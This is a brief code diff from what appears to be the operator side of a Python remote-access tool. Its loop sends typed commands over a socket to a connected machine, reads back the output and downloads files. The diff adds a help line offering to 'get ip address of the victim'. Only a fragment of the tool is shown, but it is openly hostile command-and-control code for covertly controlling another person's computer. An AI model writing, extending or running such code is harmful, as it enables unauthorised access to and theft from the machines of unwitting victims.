@@ -36,7 +36,7 @@ while msg != 'exit':
             f.close()
             print('file downloaded !')
         elif msg == 'help':
-            print()
+            print('ip    to get ip address of the victim')
         else:
             c.send(msg.encode('ascii'))
             rb = c.recv(1000000)
